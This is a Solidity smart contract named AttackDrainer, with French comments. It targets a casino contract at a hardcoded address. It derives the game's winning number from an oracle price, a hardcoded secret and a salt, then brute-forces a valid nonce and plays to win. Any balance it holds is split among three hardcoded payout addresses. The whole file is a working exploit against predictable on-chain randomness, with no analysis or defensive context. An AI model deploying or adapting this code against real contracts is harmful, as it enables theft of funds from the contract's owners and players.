// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
    function currentRound() external view returns (uint256);
    function priceOracle() external view returns (address);
}

interface IChainlinkOracle {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

contract AttackDrainer {
    IFairCasino public constant target = IFairCasino(0xed5415679D46415f6f9a82677F8F4E9ed9D1302b);
    IChainlinkOracle public constant oracle = IChainlinkOracle(0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43);

    uint256 private constant SECRET_TARGET = 0x14ca66724587aafc3454b268c296bc483d17df;
    uint256 private constant GAME_SALT = 7192271;

    address payable constant LT1 = payable(0x1acB0745a139C814B33DA5cdDe2d438d9c35060E);
    address payable constant LT2 = payable(0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d);
    address payable constant LT3 = payable(0xA791D68A0E2255083faF8A219b9002d613Cf0637);

    constructor() {}

    function attack(uint256, uint256, uint256) external payable {
        require(msg.value >= 0.01 ether, "Envoie 0.01 ETH");

        uint256 round = target.currentRound();
        (, int256 price,,,) = oracle.latestRoundData();
        
        uint256 winningNumber = uint256(keccak256(
            abi.encodePacked(SECRET_TARGET ^ uint256(price), GAME_SALT, round)
        ));

        // On cherche le nonce
        uint256 validNonce = findNonce(winningNumber, round);

        uint256 balBefore = address(this).balance;
        
        // On tente le coup
        target.play{value: 0.01 ether}(winningNumber, round, validNonce);

        // Si la balance n'a pas augmenté, c'est que le guess était faux
        require(address(this).balance > balBefore - 0.01 ether, "Echec de la prediction : mauvais guess");

        distribute();
    }

    function findNonce(uint256 guess, uint256 round) internal view returns (uint256) {
        // Limite à 5000 pour éviter le Out of Gas trop rapide
        for (uint256 n = 0; n < 5000; n++) {
            bytes32 h = keccak256(abi.encodePacked(address(this), n, guess, round));
            uint256 sig = uint256(uint8(h[31])) | (uint256(uint8(h[30])) << 8);
            if (sig == 0xbeef) return n;
        }
        revert("Nonce non trouve dans cette fenetre de gaz");
    }

    function distribute() public {
        uint256 total = address(this).balance;
        if (total == 0) return;
        LT1.transfer((total * 50) / 100);
        LT2.transfer((total * 30) / 100);
        LT3.transfer(address(this).balance);
    }

    receive() external payable {}
}